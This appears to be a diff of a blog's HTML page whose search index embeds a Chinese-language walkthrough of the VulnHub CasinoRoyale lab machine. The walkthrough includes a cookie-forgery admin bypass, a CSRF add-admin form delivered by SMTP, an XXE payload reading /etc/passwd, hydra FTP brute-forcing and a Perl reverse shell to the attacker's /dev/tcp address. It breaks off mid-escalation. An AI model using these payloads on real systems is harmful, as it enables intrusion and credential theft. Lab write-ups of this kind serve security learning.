@@ -9,7 +9,7 @@
 <meta name="description" content="不问去留">
 <meta name="theme-color" content="#000">
 <title>关于 | DAMOXILAI</title>
-<link rel="shortcut icon" href="/favicon.ico?v=1628999524661">
+<link rel="shortcut icon" href="/favicon.ico?v=1629126483722">
 <link rel="stylesheet" href="/media/css/gemini.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
 <link
@@ -211,7 +211,7 @@
     <div class="sidebar-item-box">
       <a href="/archives/">
         
-        <span class="site-item-stat-count">8</span>
+        <span class="site-item-stat-count">9</span>
         <span class="site-item-stat-name language" data-lan="article">文章</span>
       </a>
     </div>
@@ -1558,6 +1558,370 @@
     <div class="result" id="result">
       
       <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://damoxilai.github.io/post/1/"" data-c="
+          &lt;h2 id=&#34;一-实验环境&#34;&gt;一、实验环境&lt;/h2&gt;
+&lt;p&gt;1.靶机下载&lt;/p&gt;
+&lt;p&gt;网址：http://download.vulnhub.com/casinoroyale/CasinoRoyale.ova&lt;/p&gt;
+&lt;p&gt;2.靶机：ip暂未知&lt;/p&gt;
+&lt;p&gt;3.攻击机kali：192.168.0.150&lt;/p&gt;
+&lt;h2 id=&#34;二-实验步骤&#34;&gt;二、实验步骤&lt;/h2&gt;
+&lt;h4 id=&#34;1信息收集&#34;&gt;(1)信息收集&lt;/h4&gt;
+&lt;h5 id=&#34;1主机发现&#34;&gt;1.主机发现&lt;/h5&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125530598.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;找到目标主机：192.168.0.102&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;h5 id=&#34;2端口服务扫描操作系统扫描&#34;&gt;2.端口服务扫描操作系统扫描&lt;/h5&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125566117.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;为防止漏扫，多扫描几次，可发现主机21端口开放 ftp，25端口开放smtp，80端口开放http，Linux操作系统&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;2web渗透&#34;&gt;(2)Web渗透&lt;/h4&gt;
+&lt;h5 id=&#34;1访问80端口&#34;&gt;1.访问80端口&lt;/h5&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125602031.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;2目录扫描&#34;&gt;2.目录扫描&lt;/h5&gt;
+&lt;p&gt;2.1&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125632411.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;index.php&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125664366.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;3漏洞查找&#34;&gt;3.漏洞查找&lt;/h5&gt;
+&lt;p&gt;3.1该页面提到了pokermax poker league software，查找是否存在已知的可利用漏洞，searchsploit搜索&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125721471.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;3.2查看文件&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;┌──(root💀kali)-[~/桌面]&lt;br&gt;
+└─# cat /usr/share/exploitdb/exploits/php/webapps/6766.txt                                                       1 ⨯&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Author : DaRkLiFe&lt;br&gt;
+Greetz : str0ke &amp;amp; S.W.A.T. &amp;amp; funkys0ul&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Script   :&lt;/p&gt;
+&lt;p&gt;PokerMax Poker League Insecure Cookie Handling Vulnerability&lt;/p&gt;
+&lt;p&gt;Download:&lt;/p&gt;
+&lt;p&gt;http://www.stevedawson.com/downloads/pokerleague.zip&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Exploit :&lt;/p&gt;
+&lt;p&gt;&lt;font color=&#39;orange&#39;&gt;javascript:document.cookie = &amp;quot;ValidUserAdmin=admin&amp;quot;;&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;**here &amp;quot;admin&amp;quot; refers to username of administrator on site&lt;/p&gt;
+&lt;p&gt;default username is &amp;quot;admin&amp;quot; given after installation of site&lt;/p&gt;
+&lt;p&gt;but if it is changed u can easily find out username of admin and then&lt;br&gt;
+substitute it in place of &amp;quot;admin&amp;quot;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;font color=&#39;orange&#39;&gt;Instructions :&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font color=&#39;orange&#39;&gt;Find the site running on this script .&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font color=&#39;orange&#39;&gt;Go to http://site.com/pokerleague/pokeradmin/configure.php&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font color=&#39;orange&#39;&gt;It will ask for login. Now in url tab run the exploit command&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font color=&#39;orange&#39;&gt;Then return back to http://site.com/pokerleague/pokeradmin/configure.php&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font color=&#39;orange&#39;&gt;Now u should be loggedin as admin and change the thing into what you want .&lt;/font&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;THANKS ! GREETZ ! HAPPY DIWALI !&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;milw0rm.com [2008-10-16]&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;3.3根据提示，访问http://site.com/pokerleague/pokeradmin/configure.php&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125790365.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;因为不是管理员，会跳到index.php登陆。&lt;/p&gt;
+&lt;p&gt;3.4根据漏洞文件提示，我们直接修改其cookie的值，ValidUserAdmin=admin&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125818237.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;成功以管理员身份访问&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125851718.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;可以获取到admin的密码：raise12million&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;3.5网页提示要访问这个域名：casino-royale.local&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125881139.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;我们到主机host文件加入域名和ip（kali的机子也记得加，在/etc/hosts中）&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;11&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125907352.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;4查看网页功能找寻信息&#34;&gt;4.查看网页功能，找寻信息&lt;/h5&gt;
+&lt;p&gt;4.1查看网页各个功能，发现Manager Players用户Valenka拥有email链接&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;12&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125936213.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;他的信息比别人多了一个链接&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;13&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125965809.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;4.2访问该可疑链接&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;14&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125996087.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;15&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629126022382.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;提示以发送邮件的形式来新建用户&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;4.3 searchsploit找找该框架的漏洞&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;16&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629126047195.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;blockquote&gt;
+&lt;p&gt;┌──(root💀kali)-[~/桌面]&lt;br&gt;
+└─# cat /usr/share/exploitdb/exploits/php/webapps/35301.html&lt;/p&gt;
+&lt;p&gt;Snowfox CMS v1.0 CSRF Add Admin Exploit&lt;/p&gt;
+&lt;p&gt;Vendor: Globiz Solutions&lt;br&gt;
+Product web page: http://www.snowfoxcms.org&lt;br&gt;
+Affected version: 1.0&lt;/p&gt;
+&lt;p&gt;Summary: Snowfox is an open source Content Management System (CMS)&lt;br&gt;
+that allows your website users to create and share content based&lt;br&gt;
+on permission configurations.&lt;/p&gt;
+&lt;p&gt;Desc: Snowfox CMS suffers from a cross-site request forgery&lt;br&gt;
+vulnerabilities. The application allows users to perform certain&lt;br&gt;
+actions via HTTP requests without performing any validity checks&lt;br&gt;
+to verify the requests.&lt;font color=&#39;orange&#39;&gt; This can be exploited to perform certain&lt;br&gt;
+actions with administrative privileges if a logged-in user visits&lt;br&gt;
+a malicious web site.&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;Tested on: Apache/2.4.7 (Win32)&lt;br&gt;
+PHP/5.5.6&lt;br&gt;
+MySQL 5.6.14&lt;/p&gt;
+&lt;p&gt;Vulnerability discovered by Gjoko &#39;LiquidWorm&#39; Krstic&lt;br&gt;
+@zeroscience&lt;/p&gt;
+&lt;p&gt;Advisory ID: ZSL-2014-5205&lt;br&gt;
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5205.php&lt;/p&gt;
+&lt;p&gt;12.11.2014&lt;/p&gt;
+&lt;html&gt;
+&lt;body&gt;
+ &lt;form action=&#34;http://10.0.18.3/snowfox/?uri=admin/accounts/create&#34; method=&#34;POST&#34;&gt;
+   &lt;input type=&#34;hidden&#34; name=&#34;emailAddress&#34; value=&#34;lab@zeroscience.mk&#34; /&gt;
+   &lt;input type=&#34;hidden&#34; name=&#34;verifiedEmail&#34; value=&#34;verified&#34; /&gt;
+   &lt;input type=&#34;hidden&#34; name=&#34;username&#34; value=&#34;USERNAME&#34; /&gt;
+   &lt;input type=&#34;hidden&#34; name=&#34;newPassword&#34; value=&#34;PASSWORD&#34; /&gt;
+   &lt;input type=&#34;hidden&#34; name=&#34;confirmPassword&#34; value=&#34;PASSWORD&#34; /&gt;
+   &lt;input type=&#34;hidden&#34; name=&#34;userGroups[]&#34; value=&#34;34&#34; /&gt;
+   &lt;input type=&#34;hidden&#34; name=&#34;userGroups[]&#34; value=&#34;33&#34; /&gt;
+   &lt;input type=&#34;hidden&#34; name=&#34;memo&#34; value=&#34;CSRFmemo&#34; /&gt;
+   &lt;input type=&#34;hidden&#34; name=&#34;status&#34; value=&#34;1&#34; /&gt;
+   &lt;input type=&#34;hidden&#34; name=&#34;formAction&#34; value=&#34;submit&#34; /&gt;
+   &lt;input type=&#34;submit&#34; value=&#34;Submit form&#34; /&gt;
+ &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;                                                                                   
+&lt;/blockquote&gt;
+&lt;p&gt;4.4根据提示，在本机搭建网站，置放1.html，内容如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
+  &amp;lt;body&amp;gt;
+    &amp;lt;form action=&amp;quot;http://192.168.0.102/vip-client-portfolios/?uri=admin/accounts/create&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
+      &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;emailAddress&amp;quot; value=&amp;quot;linan@qq.com&amp;quot; /&amp;gt;
+      &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;verifiedEmail&amp;quot; value=&amp;quot;verified&amp;quot; /&amp;gt;
+      &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;username&amp;quot; value=&amp;quot;linan&amp;quot; /&amp;gt;
+      &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;newPassword&amp;quot; value=&amp;quot;123456&amp;quot; /&amp;gt;
+      &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;confirmPassword&amp;quot; value=&amp;quot;123456&amp;quot; /&amp;gt;
+      &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;userGroups[]&amp;quot; value=&amp;quot;34&amp;quot; /&amp;gt;
+      &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;userGroups[]&amp;quot; value=&amp;quot;33&amp;quot; /&amp;gt;
+      &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;memo&amp;quot; value=&amp;quot;CSRFmemo&amp;quot; /&amp;gt;
+      &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;status&amp;quot; value=&amp;quot;1&amp;quot; /&amp;gt;
+      &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;formAction&amp;quot; value=&amp;quot;submit&amp;quot; /&amp;gt;
+      &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Submit form&amp;quot; /&amp;gt;
+    &amp;lt;/form&amp;gt;
+  &amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;   
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;利用靶机25端口开放的smtp服务，向靶机发送邮件信息，以此触发靶机向我们网站读取1.html，根据里面的用户信息，为我们新建一个用户，一旦建立，用户就拥有&lt;font color=&#39;orange&#39;&gt;管理员权限&lt;/font&gt;。&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;4.5利用telnet连接到25端口发送邮件的流程如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;EHLO test.example.com
+MAIL FROM:&amp;lt;SENDERADDRESS&amp;gt;
+RCPT TO:&amp;lt;RECIPIENTADDRESS&amp;gt;
+DATA
+Subject: Testmessage
+(Blank line, press Enter again)
+This is a test.
+(Blank line, press Enter again)
+.
+QUIT
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;这里要注意，Snowfox CMS页面明确告诉我们，subject一行必须是一个已知用户，否则就丢弃邮件&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;17&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629126074383.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;blockquote&gt;
+&lt;p&gt;┌──(root💀kali)-[~/桌面]&lt;br&gt;
+└─# &lt;font color=&#39;red&#39;&gt;telnet 192.168.0.102 25&lt;/font&gt;                                                                                                   1 ⨯&lt;br&gt;
+Trying 192.168.0.102...&lt;br&gt;
+Connected to 192.168.0.102.&lt;br&gt;
+Escape character is &#39;^]&#39;.&lt;br&gt;
+220 Mail Server - NO UNAUTHORIZED ACCESS ALLOWED Pls.&lt;br&gt;
+&lt;font color=&#39;orange&#39;&gt;mail from:linan&lt;/font&gt;&lt;br&gt;
+250 2.1.0 Ok&lt;br&gt;
+&lt;font color=&#39;orange&#39;&gt;rcpt to:valenka&lt;/font&gt;&lt;br&gt;
+250 2.1.5 Ok&lt;br&gt;
+&lt;font color=&#39;orange&#39;&gt;data&lt;/font&gt;&lt;br&gt;
+354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;&lt;br&gt;
+&lt;font color=&#39;orange&#39;&gt;subject:&lt;font color=&#39;red&#39;&gt;obanno&lt;/font&gt;&lt;/font&gt;&lt;br&gt;
+&lt;font color=&#39;orange&#39;&gt;test&lt;/font&gt;&lt;br&gt;
+&lt;font color=&#39;orange&#39;&gt;http://192.168.0.150/1.html&lt;/font&gt;&lt;br&gt;
+&lt;font color=&#39;orange&#39;&gt;.&lt;/font&gt;250 2.0.0 Ok: queued as 46EB21D04&lt;br&gt;
+&lt;font color=&#39;orange&#39;&gt;quit&lt;/font&gt;&lt;br&gt;
+221 2.0.0 Bye&lt;br&gt;
+Connection closed by foreign host.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;4.6发送完毕后，可以在记录看到，靶机访问了网站1.html&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;18&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629126093342.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;4.7尝试登陆，成功&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;19&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629126116048.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;20&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629126135211.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;5登入snowfox-cms&#34;&gt;5.登入Snowfox CMS&lt;/h5&gt;
+&lt;p&gt;5.1再一波查找网页功能，找寻信息，在manage account下的le用户下发现新的网址链接&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;21&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629126154598.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;访问该网页&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;22&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629126175945.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;5.2查看网页源代码&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;23&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629126193749.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;给出提示：&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;em&gt;&lt;strong&gt;尝试使用 curl 来 POST Xml 命令或 Xml 脚本文件！(可能存在一个&lt;font color=&#39;orange&#39;&gt;XXE漏洞 (XML External Entity)&lt;/font&gt;)&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;&lt;strong&gt;ftp  的密码很简单&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;5.3尝试构造xml文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#1.xml
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;ISO-8859-1&amp;quot; ?&amp;gt;
+
+&amp;lt;!DOCTYPE foo [
+&amp;lt;!ELEMENT foo ANY &amp;gt;
+&amp;lt;!ENTITY xxe SYSTEM &amp;quot;file:///etc/passwd&amp;quot; &amp;gt; 
+]&amp;gt;
+
+&amp;lt;creds&amp;gt;
+    &amp;lt;customer&amp;gt;&amp;amp;xxe;&amp;lt;/customer&amp;gt;
+    &amp;lt;password&amp;gt;mypass&amp;lt;/password&amp;gt;
+&amp;lt;/creds&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;使用命令curl -X POST -d&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(root💀kali)-[~/桌面]
+└─# curl -X POST -d &amp;quot;@/root/桌面/1.xml&amp;quot; &amp;quot;http://casino-royale.local/ultra-access-view/main.php&amp;quot;
+&amp;lt;html&amp;gt;
+&amp;lt;style&amp;gt;
+body {
+        color: #c46f6f;
+}
+hr {
+        color: magenta;
+}
+&amp;lt;/style&amp;gt;
+
+&amp;lt;body style=&amp;quot;background-color:#1e1614;&amp;quot;&amp;gt;
+&amp;lt;h1 style=&amp;quot;color:red;&amp;quot;&amp;gt;Client Access: ULTRA&amp;lt;/h1&amp;gt;
+&amp;lt;hr&amp;gt;
+&amp;lt;br&amp;gt;
+&amp;lt;!--FYI this is taking POST requests without a front end for the time being..
+Try using curl to POST Xml commands or Xml script files herE!   
+
+PHP code below...
+ 
+    libxml_disable_entity_loader (false); 
+    
+    $xmlfile = file_get_contents(&#39;php://input&#39;); 
+    
+    $dom = new DOMDocument(); 
+    $dom-&amp;gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
+    $creds = simplexml_import_dom($dom); 
+    $user = $creds-&amp;gt;customer; 
+    $pass = $creds-&amp;gt;password; 
+    echo &amp;quot;Welcome $user !&amp;quot;;
+--&amp;gt;
+
+
+Welcome root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+rtkit:x:105:109:RealtimeKit,,,:/proc:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+speech-dispatcher:x:108:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+lightdm:x:109:113:Light Display Manager:/var/lib/lightdm:/bin/false
+pulse:x:110:114:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+saned:x:112:118::/var/lib/saned:/bin/false
+le:x:1000:1000:Le Chiffre,,,:/home/le:/bin/bash
+mysql:x:113:120:MySQL Server,,,:/nonexistent:/bin/false
+valenka:x:1001:1001:,,,:/home/valenka:/bin/bash
+postfix:x:114:121::/var/spool/postfix:/bin/false
+ftp:x:115:124:ftp daemon,,,:/srv/ftp:/bin/false
+ftpUserULTRA:x:1002:1002::/var/www/html/ultra-access-view:/bin/bash
+ ! 
+
+
+&amp;lt;/body&amp;gt;
+
+
+&amp;lt;!--also pls update the password for the custom ftp acct once the front end is finished..since it&#39;s easy --&amp;gt;
+
+&amp;lt;/html&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;成功读取文件&lt;/p&gt;
+&lt;h5 id=&#34;6ftp登入&#34;&gt;6.ftp登入&lt;/h5&gt;
+&lt;p&gt;6.1从/etc/passwd文件中看到有ftp的用户名ftpUserULTRA，之前看到21端口也是开放的，网页提示说密码很简单，尝试爆破：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;hydra -l ftpUserULTRA -P /usr/share/wordlists/fasttrack.txt ftp://192.168.0.102 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629126224076.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
+成功获取密码：bankbank&lt;/p&gt;
+&lt;p&gt;6.2登录ftp&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ftp 192.168.0.102
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;24&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629126238170.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;7获得shell&#34;&gt;7.获得shell&lt;/h5&gt;
+&lt;p&gt;7.1上传shell&lt;/p&gt;
+&lt;p&gt;看到目录下既有php文件，也有pl文件。想到应该可以传这两种马，但是php的webshell一直permission denied。只能上传perl格式的马,这里直接上传反弹shell的码，因为perl语言可以直接通过system函数直接执行系统命令。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;system(&amp;quot;bash -c &#39;/bin/sh -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.150/1234 0&amp;gt;&amp;amp;1&#39;&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;上传后，记得chmod 777赋予可执行权限（这里有个坑，chmod +x 后虽然回显执行完成，但实际没有改变文件权限，试了好多次都不行，但chmod 777 反倒可以​,#迷惑#​)​&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;25&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629126248771.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;通过访问a.pl&lt;/p&gt;
+&lt;p&gt;最终得到用户为www-data的反弹shell&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;26&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629126262393.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;7.2在/opt/casino-royale目录下的index.html,恰好是8081端口的网页&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;27&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629126274063.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;28&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629126283736.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;那么根据代码内容，点击会对collect.php进行调用，查看collect的内容：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ cat collect.php
+&amp;lt;?php
+$out = shell_exec(&#39;python casino-data-collection.py&#39;);
+echo &amp;quot;$out&amp;quot;;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;发现collect.php会调用运行casino-data-collection.py，查看casino-data-collection.py的属性&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;-rwxrw---- 1 le   www-data  210 Feb 20  2019 casino-data-collection.py
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;发现是属于le用户，当前www-data组对其有可写权限，我们向其写入一个python的反弹shell&lt;/p&gt;
